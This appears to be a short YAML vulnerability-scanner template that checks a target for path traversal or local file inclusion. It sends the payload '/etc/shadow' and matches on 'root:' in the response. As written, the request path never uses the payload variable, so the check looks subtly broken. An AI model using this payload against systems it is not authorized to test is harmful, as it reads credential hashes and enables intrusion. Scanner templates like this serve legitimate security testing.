id: lfi6-1042
name: 'Traversal in base'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via base'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      base:
        - '/etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
